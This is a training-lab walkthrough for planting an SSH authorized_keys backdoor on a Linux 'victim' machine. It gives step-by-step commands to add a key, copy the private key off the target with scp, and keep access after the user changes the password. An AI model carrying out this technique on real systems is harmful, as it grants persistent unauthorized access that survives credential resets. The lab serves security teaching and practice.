# Linux Backdoors

This lab setup is meant to simulate a security professional setting up a backdoor in order to maintain access to the compromised system even after the user changed the passwrod.


## Prerequisites

To set up the lab first log in on the victim machine and execute the <code>setup.sh</code> script as sudo using the following command executee in the terminal
```sh
sudo ./setup.sh
```
The purpose of the script is to create a new user and set a default passwrod. To reset the lab and start again the <code>reset.sh</code> script can be used to remove the user, after which the <code>setup.sh</code> script can be executed again.

Victim IP: **192.168.212.151**
Host IP: **192.168.1.132**

<br/>

## Instructions
The lab scenario starts on the attacker machine and all offensive techniques will be carried out from this machine.

1. Log into the victim machine with SSH using the command below. When prompted for password use: **l3tmein**
```sh
ssh web@192.168.212.151
```

2. Now that you managed access the victim machine it's time to set up the ssh backdoor via authorized keys. In the users home directory create the *.ssh* directory using the following command. Note that the . (dot) in front of the directory name means that this is a hidden directory.
```sh
mkdir .ssh
```

3. Next create a file called *authorized_keys* without any extensionu sing the touch command. This file is used to store the public SSH keys coresponding to the users who can access this server using their respective private keys.
```sh
touch .ssh/authorized_keys
```

4. One important aspect that should not be ignored is the restrictive permissions that must be seet for the *.ssh* and *authorized_keys*. This can be done with the <code>chmod</code> command.
```sh
chmod 700 .ssh
chmod 600 .ssh/authorized_keys
```

5. Next, it's time to generate a pair of ssh keys using the following command. the <code>-b</code> argument is used to specify the length of the key and the <code>-t</code> is used to specify the type of key. The ssh-keygen utility will create by default the public and private keys in the *.ssh* directory.
```sh
# Generare ssh key pair
ssh-keygen -b 4096 -t rsa
```

6. Now that the keys have been generated, it's time to copy the public key in the *authorized_keys* file, and this can be done using the cat command.
```sh
# Copy the public key in the authorized keys file
cat .ssh/id_rsa.pub >> .ssh/authorized_keys
```

7. Next it's time to copy the private key to the attacker machine, and this can be done via the <code>scp</code> command. On the attacker machine open another terminal. <code>scp</code> will copy the file *id_rsa* from the *.ssh* directory on the machine with the ip address *192.168.212.151* using the user *web* and the password **l3tmein**. The file will be copied into the current working directory on the attacker machine noted by the . (dot).
```sh
# retrieve the private key from the server using SCP to the local folder
scp web@192.168.212.151:.ssh/id_rsa .
```

8. With the private key copied, now it's time to attempt to connect to the victim machine with the private key using the following command. The <code>-i</code> argument is used to specify the path to the private key file on the attacker machine followed by the user and the ip address of the victim machine. At this point, you will not be prompted for the passwrod and will be logged on automatically.
```sh
# attempt a connection with the following command
ssh -i id_rsa web@192.168.212.151
```

9. Now that you have managed to access the victim machine without the users passwrod it's time to simulate the scenario that the user will change the passwrod. You can change the password as you already logged in using the following command.
```sh
# change the password to: web123
passwd web
``` 

10. Now log out by either typing <code>exit</code> or using the keyboard shortcut <code>Ctrl + D</code>.

11. Now try to log back in using the initial username and passwrod, it should not work:
```sh
ssh web@192.168.212.151
```

12. However, if you try to log in using the private key, it will work regardless of the password change:
```sh
ssh -i id_rsa web@192.168.212.151
```